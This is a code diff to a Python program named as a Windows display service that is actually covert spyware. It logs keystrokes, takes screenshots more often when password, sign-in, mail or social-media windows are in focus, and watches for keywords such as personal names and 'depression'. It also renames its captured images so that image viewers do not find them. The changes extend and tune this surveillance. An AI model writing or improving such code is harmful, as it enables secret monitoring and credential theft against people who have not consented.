@@ -17,7 +17,7 @@ import SMWinservice
 class WindowsDisplayService(SMWinservice.SMWinservice):
 
     def __init__(self):
-        self.__version__ = '3.0'       # parser.get('System Configuration', 'version')
+        self.__version__ = '3.0.2'       # parser.get('System Configuration', 'version')
         self.key_counter = 100           # parser.getint('System Configuration', 'key_counter')     # Number of characters to capture before writing to the file
         self.lowest_screen_capture_timer = 3
         self.default_screen_capture_timer = 10
@@ -30,7 +30,7 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
         self.ignore_application_flag = False
 
         self.save_path = 'c:\sysdata'  # parser.get('Files', 'save_path')
-        self.log_file_name = 'sysdata_logs.txt'          # parser.get('Files', 'log_file_name')
+        self.log_file_name = 'sysdata_logs_'  # will add date_stamp and extension when writing to the file
 
         self.count = 0
         self.png_count = 0
@@ -40,7 +40,7 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
         self.keys = []
         self.keys_to_write = ""
         self.keys_captured = []
-        self.sys_error_logfile = "c:\sys_error_log.txt"
+        self.sys_error_logfile = "c:\sysdata\sys_error_log.txt"
 
         self.keywords = ["anal", "anus", "arse", "ass", "ass fuck", "ass hole", "assfucker", "asshole", "assshole",
                          "bastard", "bitch", "black cock", "bloody hell", "boong", "cock", "cockfucker", "cocksuck",
@@ -56,10 +56,11 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
                          "Brian", "King", "Needham", "Joe", "Sarah", "Sara", "depression", "sad", "cry", "crying",
                          "facebook", "snapchat", "snap", "Tinder", "cry"]
 
-        self.special_applications = ["Mail", "Facebook", "Walmart", "Password", "Sign",
-                                     "Signin", "User", "User ID", "ID"]
+        self.special_applications = ["Mail", "Facebook", "Password", "Sign",
+                                     "Signin", "User", "User ID", "ID", "Radaris", "Search",
+                                     "Instagram"]
 
-        self.ignore_these_applications = ["Sublime", "Pycharm", "Excel", "Sheets", "Powerpoint"]
+        self.ignore_these_applications = ["Sublime", "Pycharm", "Excel", "Sheets", "Powerpoint", "Walmart"]
 
         self.replacementkeydict = {"Key.space": " ",
                                    "Key.enter": " <enter> ",
@@ -83,6 +84,8 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
                                    "Key.num_lock": "",
                                    "Key.page_down": "",
                                    "Key.insert": ""}
+    def get_date(self):
+        return datetime.datetime.now().strftime('%Y-%m-%d') + ".dat"
 
     def write_file(self, keys_captured):
         keys_to_write = ""
@@ -94,7 +97,7 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
 
             # Will create the file if it does not exist otherwise append
             try:
-                with open(os.path.join(self.save_path, self.log_file_name), 'a+') as f:
+                with open(os.path.join(self.save_path, self.log_file_name + self.get_date()), 'a+', encoding='utf-8') as f:
                     f.write(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "\t")
 
                     if len(keys_captured) != 0:
@@ -105,7 +108,7 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
                     f.write(keys_to_write)
                     f.write("\n")
             except Exception as e:
-                with open(self.sys_error_logfile, 'a') as f:
+                with open(self.sys_error_logfile, 'a+', encoding='utf-8') as f:
                     f.write('an error message' + str(e))
             finally:
                 self.keys.clear()  # Reset the key list
@@ -135,28 +138,27 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
             try:
                 img.save(os.path.join(self.save_path, img_file_name))
             except IOError:
-                with open(self.sys_error_logfile, 'a') as f:
-                    f.write('IOError with image' + str(IOError))
+                with open(self.sys_error_logfile, 'a+', encoding='utf-8') as f:
+                    f.write('IOError with image' + str(IOError) + "\n")
             except ValueError:
-                with open(self.sys_error_logfile, 'a') as f:
-                    f.write('ValueError with image' + str(ValueError))
+                with open(self.sys_error_logfile, 'a+', encoding='utf-8') as f:
+                    f.write('ValueError with image' + str(ValueError) + "\n")
 
             # Reset the screen_timer each time the screen is saved
             # self.storedTime = datetime.datetime.utcnow()
             self.storedTime = datetime.datetime.now()
-            # Todo validate timestamps are working correctly
 
             try:
-                # rename so image viewers don't find it by scanning drives for image files
+                # rename file so image viewers don't find it by scanning drives for image files
                 if path.exists(os.path.join(self.save_path, img_file_name)):
                     shutil.move(os.path.join(self.save_path, img_file_name),
                                 (os.path.join(self.save_path, img_file_name)[:-3] + "pnx"))  # Renames the file
             except OSError:
-                with open(self.sys_error_logfile, 'a') as f:
-                    f.write('OSError with image' + str(ValueError))
+                with open(self.sys_error_logfile, 'a+', encoding='utf-8') as f:
+                    f.write('OSError with image' + str(ValueError) + "\n")
             except ValueError:
-                with open(self.sys_error_logfile, 'a') as f:
-                    f.write('ValueError with image' + str(ValueError))
+                with open(self.sys_error_logfile, 'a+', encoding='utf-8' + "\n") as f:
+                    f.write('ValueError with image' + str(ValueError) + "\n")
 
     def on_press(self, key):
         replacementkey = ""
@@ -224,9 +226,12 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
     def application_switched(self):    # if the application focus changes, grab the screen
         if GetWindowText(GetForegroundWindow()) != self.storedWindow:
             self.write_file(self.keys)  # to keep the keystrokes with the previous window/application
-            self.keys.insert(0, ("<APPLICATION> " + str(GetWindowText(GetForegroundWindow()) + " <APPLICATION> " + "\n")))
+            self.keys.insert(0, (" <NEW WINDOW> " +
+                                 str(GetWindowText(GetForegroundWindow()) +
+                                     " <NEW WINDOW> " + "\n")))
 
-            self.storedWindow = GetWindowText(GetForegroundWindow())  # update storedWindow to the new name of the application
+            # update storedWindow to the new name of the application
+            self.storedWindow = GetWindowText(GetForegroundWindow())
             if self.is_this_a_special_application():
                 self.screen_timer = self.lowest_screen_capture_timer
             else:
@@ -245,20 +250,28 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
     def is_this_a_special_application(self):    # increase the screen capture rate for user defined 'special applications'
         for searchword in self.special_applications:
             if re.search(searchword, str(self.storedWindow), re.IGNORECASE):
-                self.keys[0] = "<USER-DEFINED-SPECIAL-APPLICATION> " + str(
-                    GetWindowText(GetForegroundWindow()) + " <USER-DEFINED-SPECIAL-APPLICATION> ")
+                if len(self.keys) != 0:
+                    self.keys[0] = "<SPECIAL-APPLICATION> " + str(
+                        GetWindowText(GetForegroundWindow()) + " <SPECIAL-APPLICATION> ")
+                else:
+                    self.keys.append("<SPECIAL-APPLICATION> " + str(
+                        GetWindowText(GetForegroundWindow()) + " <SPECIAL-APPLICATION> "))
+
                 self.write_file(self.keys)
                 return True
-            else:
-                return False
 
         return False
 
     def ignore_this_application(self):    # Stop recording for certain user defined applications
         for searchword in self.ignore_these_applications:
             if re.search(searchword, str(self.storedWindow), re.IGNORECASE):
-                self.keys[0] = "<USER-DEFINED-IGNORE-APPLICATION> " + str(
-                    GetWindowText(GetForegroundWindow()) + " <USER-DEFINED-IGNORE-APPLICATION> ")
+                if len(self.keys) != 0:
+                    self.keys[0] = "<IGNORE-APPLICATION> " + str(
+                        GetWindowText(GetForegroundWindow()) + " <IGNORE-APPLICATION> ")
+                else:  # if keys is empty then add as first element
+                    self.keys.append("<IGNORE-APPLICATION> " + str(
+                        GetWindowText(GetForegroundWindow()) + " <IGNORE-APPLICATION> "))
+
                 self.write_file(self.keys)
                 return True
 
@@ -270,6 +283,9 @@ class WindowsDisplayService(SMWinservice.SMWinservice):
             #return False
 
     def run(self):
+        with open(self.sys_error_logfile, 'a+', encoding='utf-8') as f:
+            f.write(str(datetime.datetime.now()) + '\tApplication attempting recovery\n')
+
         with Listener(on_press=lambda key: self.on_press(key),
                       on_release=lambda key: self.on_release(key)) as listener:
             listener.join()
@@ -282,11 +298,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
-
-
-
-
-
-
-
